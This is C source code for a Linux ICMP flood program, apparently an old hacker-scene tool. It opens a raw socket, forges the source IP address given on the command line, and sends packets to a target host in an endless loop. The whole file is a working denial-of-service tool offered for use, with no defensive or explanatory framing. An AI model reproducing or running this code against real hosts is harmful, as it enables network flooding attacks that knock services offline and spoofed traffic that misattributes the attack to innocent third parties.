/*****
icmp flood program with ip forging. This is linux specific.
Should work with IP_HDRINCL (or a patched 1.2.x kernel, heh).

medulla@infosoc.com
*****/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <syslog.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <linux/udp.h>


unsigned short in_cksum(unsigned short *, int);
unsigned int host2ip(char *);

#define ICMP_FLOOD 0

struct pkt
{
   struct iphdr   ip;
   struct icmphdr icmp;   
}pack;

main(int argc, char **argv)
{
   int s,i;
   struct sockaddr_in sin_dst;
   unsigned short chk;      

   i=1;
   if(geteuid() != 0)
   {
      fprintf(stderr, "j00 nonr00t suxorz kinnot run dis!#@#$\n");
      exit(0);
   }         
   if(argc != 3)
   {
      fprintf(stderr, "%s srchost dsthost\n", argv[0]);
      exit(0);
   }
   s=socket(AF_INET, SOCK_RAW, 255);
   if(s < 0)
   {
      fprintf(stderr, "cant open raw socket\n");
      exit(0);
   }
   #ifdef IP_HDRINCL
   if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i)) < 0)
   {
      fprintf(stderr, "cant set IP_HDRINCL\n");
      close(s);
      exit(0);
   }
   #endif
   pack.ip.ihl=5;
   pack.ip.version=4;
   pack.ip.tos=0;
   pack.ip.tot_len = htons(28);
   pack.ip.id=0;
   pack.ip.frag_off=0;
   pack.ip.ttl=255;
   pack.ip.protocol=1;
   pack.ip.check=0;
   pack.ip.check = chk;
   pack.ip.saddr = host2ip(argv[1]);
   pack.ip.daddr = host2ip(argv[2]);
   sin_dst.sin_addr.s_addr = pack.ip.daddr;
   pack.icmp.type = ICMP_FLOOD;
   pack.icmp.code = 0;
   pack.icmp.checksum = 0;
   chk=in_cksum((unsigned short *)&pack.icmp, 8);   
   pack.icmp.checksum=chk;
   chk=in_cksum((unsigned short *)&pack, 28);
   pack.ip.check=chk;      
   printf("now flooding %s with a source host of %s\n", argv[2], argv[1]);
   for(;;)
   {
   sendto(s, (char *)&pack, sizeof(pack), 0, (struct sockaddr *)&sin_dst, sizeof(sin_dst));
   }
}

unsigned short in_cksum(unsigned short *addr, int len)
{
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;

	/*
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);	/* add hi 16 to low 16 */
	sum += (sum >> 16);			/* add carry */
	answer = ~sum;				/* truncate to 16 bits */
	return(answer);
}

unsigned int host2ip(char *serv)
{
   struct sockaddr_in sin;
   struct hostent *hent;

   hent=gethostbyname(serv);
   if(hent == NULL) return 0;
   bzero((char *)&sin, sizeof(sin));
   bcopy(hent->h_addr, (char *)&sin.sin_addr, hent->h_length);
   return sin.sin_addr.s_addr;
}

